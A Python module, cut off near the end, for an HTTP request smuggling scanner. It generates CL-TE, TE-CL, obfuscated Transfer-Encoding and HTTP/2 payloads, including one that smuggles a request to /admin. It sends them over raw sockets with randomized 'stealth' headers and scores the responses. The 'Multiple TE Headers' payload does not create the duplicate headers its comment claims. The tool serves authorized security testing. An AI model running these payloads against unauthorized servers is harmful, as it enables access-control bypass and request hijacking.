# modules/desync_tester.py
"""
HTTP Desync Attack Tester module for modern security testing.

This module provides comprehensive HTTP Request Smuggling vulnerability detection
with support for HTTP/1.1, HTTP/2, modern payloads, and stealth capabilities.
"""

import httpx
import h2.connection
import h2.events
import threading
import difflib
import time
import sys
import ssl
import json
import csv
import os
import socket
import urllib.parse
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple, Union
from dataclasses import dataclass
from enum import Enum

from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.layout import Layout
from rich.text import Text

# Import the randomizer module for stealth headers
try:
    from core.randomizer import HeaderFactory, generate_random_ip
    RANDOMIZER_AVAILABLE = True
except ImportError:
    RANDOMIZER_AVAILABLE = False
    print("Warning: randomizer.py not found. Using basic headers.")

try:
    from core.utils import clear_console
except ImportError:
    def clear_console():
        import os
        os.system('cls' if os.name == 'nt' else 'clear')

# ============================================================================
# CONSTANTS AND CONFIGURATION
# ============================================================================

console = Console()

# Status indicators
class VulnStatus(Enum):
    VULNERABLE = "🚨"
    POTENTIAL = "🤔"
    SAFE = "🛡️"
    ERROR = "🔥"
    TIMEOUT = "⏰"

# Test confidence levels
class ConfidenceLevel(Enum):
    HIGH = "High"
    MEDIUM = "Medium" 
    LOW = "Low"

# HTTP protocol versions
class ProtocolVersion(Enum):
    HTTP1 = "HTTP/1.1"
    HTTP2 = "HTTP/2"

@dataclass
class TestResult:
    """Data class for storing test results"""
    payload_type: str
    status: str
    confidence: str
    details: str
    response_time: float
    protocol: str
    raw_response: Optional[str] = None

@dataclass
class BaselineResponse:
    """Data class for storing baseline response data"""
    status_code: int
    headers: Dict[str, str]
    body: str
    elapsed: float
    content_length: int
    protocol: str

# ============================================================================
# MODERN PAYLOAD GENERATOR
# ============================================================================

class ModernPayloadGenerator:
    """
    Generates modern HTTP Request Smuggling payloads targeting various
    server configurations and edge cases discovered in recent research.
    """
    
    def __init__(self, target_host: str, target_port: int):
        self.host = target_host
        self.port = target_port
        self.host_header = f"{target_host}:{target_port}" if target_port not in [80, 443] else target_host
    
    def generate_classic_payloads(self) -> List[Dict[str, Any]]:
        """Generate classic CL-TE and TE-CL payloads"""
        return [
            {
                "type": "CL-TE Basic",
                "protocol": "HTTP/1.1",
                "payload": self._build_raw_request(
                    method="POST",
                    path="/",
                    headers={
                        "Host": self.host_header,
                        "Content-Length": "6",
                        "Transfer-Encoding": "chunked"
                    },
                    body="0\r\n\r\nG"
                ),
                "description": "Basic CL-TE desync attempt"
            },
            {
                "type": "TE-CL Basic", 
                "protocol": "HTTP/1.1",
                "payload": self._build_raw_request(
                    method="POST",
                    path="/",
                    headers={
                        "Host": self.host_header,
                        "Transfer-Encoding": "chunked",
                        "Content-Length": "4"
                    },
                    body="1\r\nA\r\n0\r\n\r\n"
                ),
                "description": "Basic TE-CL desync attempt"
            }
        ]
    
    def generate_modern_payloads(self) -> List[Dict[str, Any]]:
        """Generate modern payloads targeting recent discoveries"""
        payloads = []
        
        # CL-TE with various Transfer-Encoding variations
        te_variations = [
            "chunked",
            " chunked",
            "chunked ",
            "\tchunked",
            "chunked\t",
            "chunked\r",
            "chunked\n",
            "x-chunked",
            "chunked, identity"
        ]
        
        for i, te_val in enumerate(te_variations):
            payloads.append({
                "type": f"CL-TE Variation {i+1}",
                "protocol": "HTTP/1.1", 
                "payload": self._build_raw_request(
                    method="POST",
                    path="/",
                    headers={
                        "Host": self.host_header,
                        "Content-Length": "6",
                        "Transfer-Encoding": te_val
                    },
                    body="0\r\n\r\nG"
                ),
                "description": f"CL-TE with TE header: '{te_val}'"
            })
        
        # Multiple Transfer-Encoding headers
        payloads.append({
            "type": "Multiple TE Headers",
            "protocol": "HTTP/1.1",
            "payload": self._build_raw_request(
                method="POST",
                path="/",
                headers={
                    "Host": self.host_header,
                    "Content-Length": "6",
                    "Transfer-Encoding": "identity",
                    "Transfer-Encoding": "chunked"  # This will create duplicate headers
                },
                body="0\r\n\r\nG"
            ),
            "description": "Multiple Transfer-Encoding headers"
        })
        
        # CL-TE with request smuggling prefix
        payloads.append({
            "type": "CL-TE Prefix Smuggling",
            "protocol": "HTTP/1.1",
            "payload": self._build_raw_request(
                method="POST", 
                path="/",
                headers={
                    "Host": self.host_header,
                    "Content-Length": "51",
                    "Transfer-Encoding": "chunked"
                },
                body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + self.host_header + "\r\n\r\n"
            ),
            "description": "CL-TE attempting to smuggle GET /admin request"
        })
        
        # HTTP/2 specific payloads
        if self._supports_http2():
            payloads.extend(self.generate_http2_payloads())
            
        return payloads
    
    def generate_http2_payloads(self) -> List[Dict[str, Any]]:
        """Generate HTTP/2 specific smuggling payloads"""
        return [
            {
                "type": "HTTP/2 CL Header",
                "protocol": "HTTP/2",
                "payload": {
                    "method": "POST",
                    "path": "/",
                    "headers": {
                        ":authority": self.host_header,
                        ":method": "POST", 
                        ":path": "/",
                        ":scheme": "https",
                        "content-length": "0"  # HTTP/2 shouldn't have CL header
                    },
                    "body": ""
                },
                "description": "HTTP/2 request with forbidden Content-Length header"
            },
            {
                "type": "HTTP/2 TE Header",
                "protocol": "HTTP/2", 
                "payload": {
                    "method": "POST",
                    "path": "/",
                    "headers": {
                        ":authority": self.host_header,
                        ":method": "POST",
                        ":path": "/", 
                        ":scheme": "https",
                        "transfer-encoding": "chunked"  # HTTP/2 shouldn't have TE header
                    },
                    "body": ""
                },
                "description": "HTTP/2 request with forbidden Transfer-Encoding header"
            }
        ]
    
    def _build_raw_request(self, method: str, path: str, headers: Dict[str, str], body: str = "") -> bytes:
        """Build a raw HTTP/1.1 request"""
        request_line = f"{method} {path} HTTP/1.1\r\n"
        header_lines = ""
        for key, value in headers.items():
            header_lines += f"{key}: {value}\r\n"
        
        raw_request = f"{request_line}{header_lines}\r\n{body}"
        return raw_request.encode('utf-8')
    
    def _supports_http2(self) -> bool:
        """Check if target supports HTTP/2"""
        try:
            # Simple ALPN check
            context = ssl.create_default_context()
            context.set_alpn_protocols(['h2', 'http/1.1'])
            
            with socket.create_connection((self.host, self.port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    return ssock.selected_alpn_protocol() == 'h2'
        except Exception:
            return False

# ============================================================================
# TARGET VALIDATION
# ============================================================================

class TargetValidator:
    """
    Validates and confirms test targets before running security tests.
    Ensures targets are reachable and appropriate for testing.
    """
    
    def __init__(self, console: Console):
        self.console = console
    
    def validate_target(self, url: str, port: int) -> Tuple[bool, str, Dict[str, Any]]:
        """
        Comprehensive target validation including reachability,
        SSL/TLS configuration, and HTTP version support.
        
        Returns:
            Tuple of (is_valid, error_message, target_info)
        """
        try:
            parsed_url = urllib.parse.urlparse(url)
            if not parsed_url.scheme or not parsed_url.netloc:
                return False, "Invalid URL format", {}
            
            host = parsed_url.hostname
            if not host:
                return False, "Cannot extract hostname from URL", {}
            
            # Basic connectivity test
            self.console.print(f"[cyan]Testing connectivity to {host}:{port}...[/cyan]")
            if not self._test_connectivity(host, port):
                return False, f"Cannot connect to {host}:{port}", {}
            
            # HTTP version detection
            self.console.print("[cyan]Detecting HTTP version support...[/cyan]")
            version_info = self._detect_http_versions(host, port, parsed_url.scheme == 'https')
            
            # Server fingerprinting
            self.console.print("[cyan]Gathering server information...[/cyan]")
            server_info = self._get_server_info(url, port)
            
            target_info = {
                "host": host,
                "port": port,
                "scheme": parsed_url.scheme,
                "http_versions": version_info,
                "server_info": server_info
            }
            
            return True, "", target_info
            
        except Exception as e:
            return False, f"Validation error: {str(e)}", {}
    
    def _test_connectivity(self, host: str, port: int, timeout: int = 5) -> bool:
        """Test basic TCP connectivity"""
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except (socket.timeout, ConnectionRefusedError, socket.gaierror):
            return False
    
    def _detect_http_versions(self, host: str, port: int, use_ssl: bool) -> Dict[str, bool]:
        """Detect supported HTTP versions"""
        versions = {"HTTP/1.1": False, "HTTP/2": False}
        
        # Test HTTP/1.1
        try:
            with httpx.Client(http2=False, verify=False) as client:
                response = client.get(f"{'https' if use_ssl else 'http'}://{host}:{port}", timeout=10)
                versions["HTTP/1.1"] = True
        except Exception:
            pass
        
        # Test HTTP/2
        try:
            with httpx.Client(http2=True, verify=False) as client:
                response = client.get(f"{'https' if use_ssl else 'http'}://{host}:{port}", timeout=10)
                if hasattr(response, 'http_version') and response.http_version == "HTTP/2":
                    versions["HTTP/2"] = True
        except Exception:
            pass
        
        return versions
    
    def _get_server_info(self, url: str, port: int) -> Dict[str, str]:
        """Gather server information from headers"""
        info = {}
        try:
            with httpx.Client(verify=False, timeout=10) as client:
                response = client.get(f"{url}:{port}")
                info.update({
                    "server": response.headers.get("Server", "Unknown"),
                    "powered_by": response.headers.get("X-Powered-By", "Unknown"),
                    "status_code": response.status_code,
                    "content_type": response.headers.get("Content-Type", "Unknown")
                })
        except Exception as e:
            info["error"] = str(e)
        
        return info

# ============================================================================
# ENHANCED BASELINE COMPARISON
# ============================================================================

class BaselineComparator:
    """
    baseline comparison system that accounts for dynamic content
    and provides more accurate desync detection.
    """
    
    def __init__(self):
        self.baselines: List[BaselineResponse] = []
        self.dynamic_patterns = []
    
    def establish_baselines(self, url: str, port: int, headers_factory: Optional[Any] = None, count: int = 5) -> bool:
        """
        Establish multiple baseline responses to account for dynamic content.
        
        Args:
            url: Target URL
            port: Target port
            headers_factory: HeaderFactory instance for stealth headers
            count: Number of baseline requests to send
        """
        console.print(f"[cyan]Establishing {count} baseline responses...[/cyan]")
        
        try:
            for i in range(count):
                headers = {}
                if headers_factory and RANDOMIZER_AVAILABLE:
                    headers = headers_factory.get_headers()
                else:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                    }
                
                with httpx.Client(http2=False, verify=False, timeout=15) as client:
                    response = client.get(f"{url}:{port}", headers=headers)
                    
                    baseline = BaselineResponse(
                        status_code=response.status_code,
                        headers=dict(response.headers),
                        body=response.text,
                        elapsed=response.elapsed.total_seconds(),
                        content_length=len(response.text),
                        protocol="HTTP/1.1"
                    )
                    
                    self.baselines.append(baseline)
                    time.sleep(1)  # Space out baseline requests
            
            self._analyze_dynamic_content()
            console.print(f"[green]✅ {len(self.baselines)} baselines established[/green]")
            return True
            
        except Exception as e:
            console.print(f"[red]❌ Failed to establish baselines: {e}[/red]")
            return False
    
    def _analyze_dynamic_content(self):
        """Analyze baselines to identify dynamic content patterns"""
        if len(self.baselines) < 2:
            return
        
        # Compare bodies to find dynamic elements
        first_body = self.baselines[0].body
        for baseline in self.baselines[1:]:
            # Use difflib to find differences
            diff = difflib.unified_diff(
                first_body.splitlines(),
                baseline.body.splitlines(),
                lineterm=''
            )
            
            for line in diff:
                if line.startswith('+') or line.startswith('-'):
                    # This represents dynamic content
                    self.dynamic_patterns.append(line[1:].strip())
    
    def compare_response(self, test_response: Dict[str, Any]) -> Tuple[ConfidenceLevel, str]:
        """
        Compare test response against established baselines with dynamic content awareness.
        
        Args:
            test_response: Dictionary containing test response data
            
        Returns:
            Tuple of (confidence_level, details)
        """
        if not self.baselines:
            return ConfidenceLevel.LOW, "No baseline established"
        
        # Get average baseline metrics
        avg_baseline_time = sum(b.elapsed for b in self.baselines) / len(self.baselines)
        baseline_status_codes = set(b.status_code for b in self.baselines)
        
        details = []
        confidence_factors = []
        
        # 1. Timing Analysis
        test_time = test_response.get('elapsed', 0)
        if test_time > avg_baseline_time * 3:  # Significantly slower
            confidence_factors.append(0.8)
            details.append(f"Significant delay: {test_time:.2f}s vs avg {avg_baseline_time:.2f}s")
        elif test_time < avg_baseline_time * 0.3:  # Much faster
            confidence_factors.append(0.6)
            details.append(f"Unusually fast response: {test_time:.2f}s")
        
        # 2. Status Code Analysis
        test_status = test_response.get('status_code', 0)
        if test_status not in baseline_status_codes:
            confidence_factors.append(0.9)
            details.append(f"Status code changed: {test_status} not in baseline {list(baseline_status_codes)}")
        
        # 3. Content Length Analysis
        test_content_length = len(test_response.get('body', ''))
        baseline_lengths = [b.content_length for b in self.baselines]
        avg_baseline_length = sum(baseline_lengths) / len(baseline_lengths)
        
        if abs(test_content_length - avg_baseline_length) > avg_baseline_length * 0.5:
            confidence_factors.append(0.7)
            details.append(f"Significant content length difference: {test_content_length} vs avg {avg_baseline_length:.0f}")
        
        # 4. Body Content Analysis (accounting for dynamic content)
        test_body = test_response.get('body', '')
        body_similarities = []
        
        for baseline in self.baselines:
            similarity = difflib.SequenceMatcher(None, baseline.body, test_body).ratio()
            body_similarities.append(similarity)
        
        avg_similarity = sum(body_similarities) / len(body_similarities)
        if avg_similarity < 0.7:  # Less than 70% similar
            confidence_factors.append(0.6)
            details.append(f"Body content differs significantly (similarity: {avg_similarity:.2%})")
        
        # 5. Header Analysis
        test_headers = test_response.get('headers', {})
        baseline_headers = self.baselines[0].headers
        
        missing_headers = set(baseline_headers.keys()) - set(test_headers.keys())
        if missing_headers:
            confidence_factors.append(0.5)
            details.append(f"Missing headers: {', '.join(missing_headers)}")
        
        # Calculate overall confidence
        if not confidence_factors:
            return ConfidenceLevel.LOW, "Response appears normal"
        
        max_confidence = max(confidence_factors)
        
        if max_confidence >= 0.8:
            return ConfidenceLevel.HIGH, "; ".join(details)
        elif max_confidence >= 0.6:
            return ConfidenceLevel.MEDIUM, "; ".join(details)
        else:
            return ConfidenceLevel.LOW, "; ".join(details)

# ============================================================================
# MAIN REQUEST SMUGGLER CLASS
# ============================================================================

class RequestSmuggler:
    """
    HTTP Request Smuggling tester with modern payloads,
    HTTP/2 support, stealth capabilities, and improved detection.
    """
    
    def __init__(self, url: str, port: int, custom_headers: str = ""):
        self.target_url = url
        self.port = port
        self.custom_headers = self._parse_headers(custom_headers)
        self.results: List[TestResult] = []
        self.lock = threading.Lock()
        self.scan_completed = False
        
        # Initialize components
        self.validator = TargetValidator(console)
        self.comparator = BaselineComparator()
        self.payload_generator = None
        self.headers_factory = None
        
        # Initialize header factory if randomizer is available
        if RANDOMIZER_AVAILABLE:
            try:
                self.headers_factory = HeaderFactory(pool_size=100)
                console.print("[green]✅ Stealth header factory initialized[/green]")
            except Exception as e:
                console.print(f"[yellow]⚠️ Header factory failed: {e}[/yellow]")
        
        # Target information
        self.target_info: Dict[str, Any] = {}
    
    def _parse_headers(self, headers_str: str) -> Dict[str, str]:
        """Parse custom headers string into dictionary"""
        headers = {}
        if headers_str:
            try:
                for header in headers_str.split(','):
                    if ':' in header:
                        key, value = header.split(':', 1)
                        headers[key.strip()] = value.strip()
            except ValueError:
                console.print("[bold red]Invalid header format. Using default headers.[/bold red]")
        return headers
    
    def display_header(self):
        """Display application header and warnings"""
        header_text = Text("Enhanced HTTP Desync Tester", justify="center")
        console.print(Panel(header_text, style="bold magenta", border_style="magenta"))
        console.print(Panel(
            "[bold yellow]⚠️ WARNING ⚠️[/bold yellow]\n"
            "This tool performs security testing that may:\n"
            "• Trigger security alerts and monitoring systems\n" 
            "• Cause service disruption or instability\n"
            "• Violate terms of service or legal agreements\n\n"
            "[bold red]Only use on systems you own or have explicit written permission to test![/bold red]",
            border_style="red"
        ))
    
    def validate_target(self) -> bool:
        """Validate target before testing"""
        console.print("\n[bold cyan]Step 1: Target Validation[/bold cyan]")
        
        is_valid, error_msg, target_info = self.validator.validate_target(self.target_url, self.port)
        
        if not is_valid:
            console.print(f"[bold red]❌ Target validation failed: {error_msg}[/bold red]")
            return False
        
        self.target_info = target_info
        
        # Display target information
        info_table = Table(title="Target Information", show_header=True)
        info_table.add_column("Property", style="cyan")
        info_table.add_column("Value", style="white")
        
        info_table.add_row("Host", target_info["host"])
        info_table.add_row("Port", str(target_info["port"]))
        info_table.add_row("Scheme", target_info["scheme"])
        
        # HTTP versions
        versions = [v for v, supported in target_info["http_versions"].items() if supported]
        info_table.add_row("HTTP Versions", ", ".join(versions) or "None detected")
        
        # Server info
        server_info = target_info.get("server_info", {})
        if "server" in server_info:
            info_table.add_row("Server", server_info["server"])
        if "powered_by" in server_info:
            info_table.add_row("X-Powered-By", server_info["powered_by"])
        
        console.print(info_table)
        
        # Initialize payload generator with target info
        parsed_url = urllib.parse.urlparse(self.target_url)
        self.payload_generator = ModernPayloadGenerator(
            target_host=parsed_url.hostname,
            target_port=self.port
        )
        
        return True
    
    def establish_baselines(self) -> bool:
        """Establish baseline responses"""
        console.print("\n[bold cyan]Step 2: Baseline Establishment[/bold cyan]")
        
        return self.comparator.establish_baselines(
            url=self.target_url,
            port=self.port,
            headers_factory=self.headers_factory,
            count=5
        )
    
    def generate_test_payloads(self) -> List[Dict[str, Any]]:
        """Generate comprehensive test payloads"""
        console.print("\n[bold cyan]Step 3: Payload Generation[/bold cyan]")
        
        if not self.payload_generator:
            console.print("[red]❌ Payload generator not initialized[/red]")
            return []
        
        payloads = []
        
        # Add classic payloads
        classic_payloads = self.payload_generator.generate_classic_payloads()
        payloads.extend(classic_payloads)
        console.print(f"[green]✅ Generated {len(classic_payloads)} classic payloads[/green]")
        
        # Add modern payloads  
        modern_payloads = self.payload_generator.generate_modern_payloads()
        payloads.extend(modern_payloads)
        console.print(f"[green]✅ Generated {len(modern_payloads)} modern payloads[/green]")
        
        console.print(f"[bold green]Total payloads: {len(payloads)}[/bold green]")
        return payloads
    
    def test_payload(self, payload_data: Dict[str, Any], progress: Progress, task_id: Any):
        """
        Test a single payload with enhanced error handling and analysis.
        
        Args:
            payload_data: Dictionary containing payload information
            progress: Rich progress instance
            task_id: Progress task identifier
        """
        payload_type = payload_data["type"]
        protocol = payload_data.get("protocol", "HTTP/1.1")
        
        result = TestResult(
            payload_type=payload_type,
            status="Error",
            confidence="Low", 
            details="",
            response_time=0.0,
            protocol=protocol
        )
        
        try:
            # Get stealth headers if available
            headers = {}
            if self.headers_factory and RANDOMIZER_AVAILABLE:
                headers = self.headers_factory.get_headers()
            else:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                }
            
            # Add custom headers
            headers.update(self.custom_headers)
            
            start_time = time.time()
            
            if protocol == "HTTP/2":
                response_data = self._send_http2_request(payload_data, headers)
            else:
                response_data = self._send_http1_request(payload_data, headers)
            
            elapsed = time.time() - start_time
            result.response_time = elapsed
            
            # Analyze response using enhanced comparator
            confidence, details = self.comparator.compare_response(response_data)
            
            # Update result based on analysis
            if confidence == ConfidenceLevel.HIGH:
                result.status = f"[bold red]{VulnStatus.VULNERABLE.value} Vulnerable[/bold red]"
                result.confidence = "[red]High[/red]"
            elif confidence == ConfidenceLevel.MEDIUM:
                result.status = f"[bold yellow]{VulnStatus.POTENTIAL.value} Potentially Vulnerable[/bold yellow]"
                result.confidence = "[yellow]Medium[/yellow]"
            else:
                result.status = f"[green]{VulnStatus.SAFE.value} Likely Safe[/green]"
                result.confidence = "[green]Low[/green]"
            
            result.details = details
            
        except httpx.ReadTimeout:
            result.status = f"[bold yellow]{VulnStatus.TIMEOUT.value} Timeout[/bold yellow]"
            result.confidence = "[yellow]Medium[/yellow]"
            result.details = "Request timed out - possible desync or server overload"
            
        except httpx.ConnectTimeout:
            result.status = f"[red]{VulnStatus.ERROR.value} Connection Timeout[/red]"
            result.details = "Could not establish connection within timeout period"
            
        except Exception as e:
            result.details = f"Unexpected error: {str(e)}"
        
        with self.lock:
            self.results.append(result)
        
        progress.update(task_id, advance=1)
    
    def _send_http1_request(self, payload_data: Dict[str, Any], headers: Dict[str, str]) -> Dict[str, Any]:
        """Send HTTP/1.1 request with raw payload"""
        raw_payload = payload_data["payload"]
        
        # For raw payloads, we need to send them directly
        parsed_url = urllib.parse.urlparse(self.target_url)
        
        if isinstance(raw_payload, bytes):
            # Send raw bytes directly via socket
            return self._send_raw_payload(raw_payload, parsed_url.hostname, self.port)
        else:
            # Use httpx for structured requests
            with httpx.Client(http2=False, verify=False, timeout=20) as client:
                response = client.post(
                    f"{self.target_url}:{self.port}",
                    headers=headers,
                    content=raw_payload
                )
                
                return {
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'body': response.text,
                    'elapsed': response.elapsed.total_seconds()
                }
    
    def _send_raw_payload(self, payload: bytes, host: str, port: int) -> Dict[str, Any]:
        """Send raw payload via direct socket connection"""
        try:
            start_time = time.time()
            
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(20)
            
            # Handle SSL/TLS if needed
            if self.target_url.startswith('https'):
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            sock.send(payload)
            
            # Read response
            response_data = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk
                except socket.timeout:
                    break
            
            sock.close()
            elapsed = time.time() - start_time
            
            # Parse HTTP response
            response_text = response_data.decode('utf-8', errors='ignore')
            
            # Extract status code
            status_code = 0
            if response_text:
                first_line = response_text.split('\n')[0]
                if 'HTTP/' in first_line:
                    parts = first_line.split()
                    if len(parts) >= 2:
                        try:
                            status_code = int(parts[1])
                        except ValueError:
                            status_code = 0
            
            # Extract headers
            headers = {}
            if '\r\n\r\n' in response_text:
                header_section = response_text.split('\r\n\r\n')[0]
                for line in header_section.split('\r\n')[1:]:  # Skip status line
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
            
            # Extract body
            body = ""
            if '\r\n\r\n' in response_text:
                body = response_text.split('\r\n\r\n', 1)[1]
            
            return {
                'status_code': status_code,
                'headers': headers,
                'body': body,
                'elapsed': elapsed
            }
            
        except Exception as e:
            return {
                'status_code': 0,
                'headers': {},
                'body': f"Error: {str(e)}",
                'elapsed': 0
            }
    
    def _send_http2_request(self, payload_data: Dict[str, Any], headers: Dict[str, str]) -> Dict[str, Any]:
        """Send HTTP/2 request using h2 library"""
        try:
            # HTTP/2 requests use httpx with http2=True
            with httpx.Client(http2=True, verify=False, timeout=20) as client:
                h2_payload = payload_data["payload"]
                
                # For HTTP/2, payload should be a dict with method, path, headers, body
                if isinstance(h2_payload, dict):
                    method = h2_payload.get("method", "GET")
                    path = h2_payload.get("path", "/")
                    h2_headers = h2_payload.get("headers", {})
                    body = h2_payload.get("body", "")
                    
                    # Merge with stealth headers
                    final_headers = {**headers, **h2_headers}
                    
                    if method.upper() == "POST":
                        response = client.post(
                            f"{self.target_url}:{self.port}{path}",
                            headers=final_headers,
                            content=body
                        )
                    else:
                        response = client.get(
                            f"{self.target_url}:{self.port}{path}",
                            headers=final_headers
                        )
                    
                    return {
                        'status_code': response.status_code,
                        'headers': dict(response.headers),
                        'body': response.text,
                        'elapsed': response.elapsed.total_seconds()
                    }
                else:
                    # Fallback for malformed HTTP/2 payload
                    return {
                        'status_code': 0,
                        'headers': {},
                        'body': "Invalid HTTP/2 payload format",
                        'elapsed': 0
                    }
                    
        except Exception as e:
            return {
                'status_code': 0,
                'headers': {},
                'body': f"HTTP/2 Error: {str(e)}",
                'elapsed': 0
            }
    
    def run_concurrent_tests(self, payloads: List[Dict[str, Any]], max_threads: int = 5):
        """
        Execute all payload tests with controlled concurrency.
        
        Args:
            payloads: List of payload dictionaries to test
            max_threads: Maximum number of concurrent threads
        """
        console.print(f"\n[bold cyan]Step 4: Executing {len(payloads)} tests[/bold cyan] 🚀")
        console.print(f"[dim]Using max {max_threads} concurrent threads for controlled testing[/dim]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Testing Payloads...", total=len(payloads))
            
            # Use ThreadPoolExecutor for better thread management
            from concurrent.futures import ThreadPoolExecutor, as_completed
            
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                # Submit all tasks
                futures = []
                for payload in payloads:
                    future = executor.submit(self.test_payload, payload, progress, task)
                    futures.append(future)
                    
                    # Small delay to avoid overwhelming the target
                    time.sleep(0.2)
                
                # Wait for completion
                for future in as_completed(futures):
                    try:
                        future.result()  # This will raise any exceptions that occurred
                    except Exception as e:
                        console.print(f"[red]Thread error: {e}[/red]")
        
        self.scan_completed = True
    
    def display_results(self):
        """Display comprehensive results with enhanced formatting"""
        console.print("\n[bold green]✨ Scan Complete! Analysis Results:[/bold green]")
        
        if not self.results:
            console.print("[yellow]No results to display[/yellow]")
            return
        
        # Create results table
        table = Table(
            title="HTTP Desync Test Results",
            show_lines=True,
            header_style="bold magenta",
            title_style="bold white"
        )
        
        table.add_column("Payload Type", style="cyan", no_wrap=False, min_width=20)
        table.add_column("Protocol", style="blue", justify="center", min_width=8)
        table.add_column("Status", justify="center", min_width=18)
        table.add_column("Confidence", justify="center", min_width=10)
        table.add_column("Response Time", justify="right", min_width=12)
        table.add_column("Details", style="dim", min_width=30)
        
        # Sort results: High confidence first, then Medium, then Low
        def sort_key(result):
            if "[red]High[/red]" in result.confidence:
                return (0, result.payload_type)
            elif "[yellow]Medium[/yellow]" in result.confidence:
                return (1, result.payload_type)
            else:
                return (2, result.payload_type)
        
        sorted_results = sorted(self.results, key=sort_key)
        
        # Add rows to table
        for result in sorted_results:
            table.add_row(
                result.payload_type,
                result.protocol,
                result.status,
                result.confidence,
                f"{result.response_time:.2f}s",
                result.details[:80] + "..." if len(result.details) > 80 else result.details
            )
        
        console.print(table)
        
        # Summary statistics
        self._display_summary_stats()
        
        # Recommendations
        self._display_recommendations()
    
    def _display_summary_stats(self):
        """Display summary statistics"""
        if not self.results:
            return
        
        total = len(self.results)
        high_confidence = sum(1 for r in self.results if "[red]High[/red]" in r.confidence)
        medium_confidence = sum(1 for r in self.results if "[yellow]Medium[/yellow]" in r.confidence) 
        low_confidence = sum(1 for r in self.results if "[green]Low[/green]" in r.confidence)
        
        avg_response_time = sum(r.response_time for r in self.results) / total
        
        stats_table = Table(title="Summary Statistics", show_header=False)
        stats_table.add_column("Metric", style="bold cyan")
        stats_table.add_column("Value", style="white")
        
        stats_table.add_row("Total Tests", str(total))
        stats_table.add_row("High Confidence", f"[red]{high_confidence}[/red]")
        stats_table.add_row("Medium Confidence", f"[yellow]{medium_confidence}[/yellow]")
        stats_table.add_row("Low Confidence", f"[green]{low_confidence}[/green]")
        stats_table.add_row("Average Response Time", f"{avg_response_time:.2f}s")
        
        console.print("\n", stats_table)
    
    def _display_recommendations(self):
        """Display actionable recommendations based on results"""
        high_confidence_results = [r for r in self.results if "[red]High[/red]" in r.confidence]
        medium_confidence_results = [r for r in self.results if "[yellow]Medium[/yellow]" in r.confidence]
        
        recommendations = []
        
        if high_confidence_results:
            recommendations.extend([
                "🚨 [bold red]HIGH PRIORITY[/bold red]: Potential HTTP Request Smuggling vulnerabilities detected!",
                "   • Immediately investigate the high-confidence findings",
                "   • Check server/proxy configurations for HTTP parsing inconsistencies",
                "   • Review load balancer and reverse proxy settings",
                "   • Consider implementing strict HTTP parsing rules"
            ])
        
        if medium_confidence_results:
            recommendations.extend([
                "⚠️ [bold yellow]MEDIUM PRIORITY[/bold yellow]: Suspicious behavior detected:",
                "   • Manually verify medium-confidence findings",
                "   • Monitor for unusual response patterns",
                "   • Check for timeout-based detection evasion"
            ])
        
        if not high_confidence_results and not medium_confidence_results:
            recommendations.extend([
                "✅ [green]No obvious vulnerabilities detected[/green]",
                "   • Target appears to handle HTTP parsing consistently", 
                "   • Consider testing with additional payloads or different conditions",
                "   • Verify that security controls are not interfering with tests"
            ])
        
        # General recommendations
        recommendations.extend([
            "",
            "📋 [bold]General Security Recommendations:[/bold]",
            "   • Ensure consistent HTTP parsing across all infrastructure components",
            "   • Implement proper HTTP validation and sanitization",
            "   • Use HTTP/2 where possible (more resistant to smuggling)",
            "   • Monitor for unusual HTTP traffic patterns",
            "   • Regular security testing of web infrastructure"
        ])
        
        console.print("\n[bold]🎯 Recommendations:[/bold]")
        for rec in recommendations:
            console.print(rec)
    
    def run_full_scan(self):
        """
        Execute the complete scanning workflow with all enhanced features.
        """
        clear_console()
        self.display_header()
        
        # Get user confirmation before proceeding
        if not Confirm.ask("\n[bold]Do you have explicit authorization to test this target?[/bold]"):
            console.print("[red]Exiting - Authorization required for security testing[/red]")
            sys.exit(0)
        
        try:
            # Step 1: Validate target
            if not self.validate_target():
                console.print("[red]❌ Target validation failed. Exiting.[/red]")
                sys.exit(1)
            
            # Step 2: Establish baselines
            if not self.establish_baselines():
                console.print("[red]❌ Baseline establishment failed. Exiting.[/red]")
                sys.exit(1)
            
            # Step 3: Generate payloads
            payloads = self.generate_test_payloads()
            if not payloads:
                console.print("[red]❌ No payloads generated. Exiting.[/red]")
                sys.exit(1)
            
            # Step 4: Execute tests
            max_threads = IntPrompt.ask(
                "[cyan]Maximum concurrent threads[/cyan] (recommended: 3-5 for stability)",
                default=3,
                show_default=True
            )
            
            self.run_concurrent_tests(payloads, max_threads)
            
            # Step 5: Display results
            self.display_results()
            
            # Ask if user wants to save results
            if Confirm.ask("\n[bold]Save results to file?[/bold]"):
                self.save_results_to_file()
                
        except KeyboardInterrupt:
            console.print("\n[yellow]⚠️ Scan interrupted by user[/yellow]")
            if self.results:
                console.print("Displaying partial results...")
                self.display_results()
        except Exception as e:
            console.print(f"\n[red]❌ Unexpected error during scan: {e}[/red]")
            if self.results:
                console.print("Displaying partial results...")
                self.display_results()
    
    def save_results_to_file(self):
        """Save scan results to a formatted text file"""
        try:
